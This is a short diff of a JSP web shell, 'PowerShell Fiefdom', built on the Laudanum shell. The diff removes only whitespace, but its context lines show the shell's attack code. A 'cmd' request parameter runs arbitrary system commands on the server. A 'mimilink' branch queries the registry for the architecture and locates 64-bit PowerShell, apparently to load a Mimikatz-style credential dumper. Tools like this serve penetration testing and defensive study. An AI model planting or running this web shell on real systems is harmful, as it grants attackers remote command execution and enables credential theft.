@@ -1,5 +1,4 @@
 <%@ page import="java.util.*,java.io.*"%>
-
 <HTML>
 <TITLE>PowerShell Fiefdom, based on the Laudanum JSP Shell</TITLE>
 <BODY>
@@ -32,8 +31,6 @@ if (request.getParameter("cmd") != null) {
 	p.getOutputStream().close();
 	p.getInputStream().close();
 }
-
-
 if (request.getParameter("mimilink") != null) {
 	out.println("Determining Architecture<BR>");
 	Process r = Runtime.getRuntime().exec("cmd /c reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v PROCESSOR_ARCHITECTURE");
@@ -53,7 +50,6 @@ if (request.getParameter("mimilink") != null) {
 		}
 		rdisr = rdis.readLine();
 	}
-	
 	if (arch == "64"){
 		//Search for 64 bit powershell
 		Process f = Runtime.getRuntime().exec("cmd /c dir %windir%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe");
@@ -176,7 +172,6 @@ if (request.getParameter("mimilink") != null) {
 	}
 	m.getOutputStream().close();
 	m.getInputStream().close();
-
 }
 %>
 </pre>
